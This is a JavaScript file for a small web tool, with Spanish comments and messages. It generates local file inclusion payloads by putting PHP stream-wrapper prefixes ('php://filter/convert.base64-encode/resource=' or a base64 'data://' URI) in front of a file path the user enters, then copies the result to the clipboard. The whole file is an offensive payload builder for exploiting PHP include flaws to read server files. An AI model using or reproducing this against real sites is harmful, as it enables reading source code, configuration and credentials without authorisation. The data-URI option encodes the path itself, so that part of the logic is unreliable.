document.addEventListener('DOMContentLoaded', () => {
    const filePathInput = document.getElementById('file-path-input');
    const wrapperSelect = document.getElementById('wrapper-select');
    const generateBtn = document.getElementById('generate-btn');
    const payloadOutput = document.getElementById('payload-output');
    const resultSection = document.getElementById('result-section');
    const copyBtn = document.getElementById('copy-btn');

    // Mapeo de técnicas de ofuscación
    const wrappers = {
        'php-filter': 'php://filter/convert.base64-encode/resource=',
        'data-uri': 'data://text/plain;base64,',
    };

    generateBtn.addEventListener('click', () => {
        const filePath = filePathInput.value.trim();
        const selectedWrapper = wrapperSelect.value;
        let payload = '';

        if (!filePath) {
            alert('Por favor, introduce una ruta de archivo.');
            return;
        }

        switch (selectedWrapper) {
            case 'php-filter':
                payload = `${wrappers['php-filter']}${filePath}`;
                break;
            case 'data-uri':
                const base64EncodedPath = btoa(filePath); // Codifica la ruta en Base64
                payload = `${wrappers['data-uri']}${base64EncodedPath}`;
                break;
            default:
                payload = filePath;
                break;
        }

        payloadOutput.textContent = payload;
        resultSection.classList.remove('hidden');
    });

    copyBtn.addEventListener('click', () => {
        const textToCopy = payloadOutput.textContent;
        navigator.clipboard.writeText(textToCopy).then(() => {
            alert('Payload copiado al portapapeles.');
        }).catch(err => {
            console.error('Error al copiar el texto: ', err);
            alert('No se pudo copiar el texto. Inténtalo manualmente.');
        });
    });
});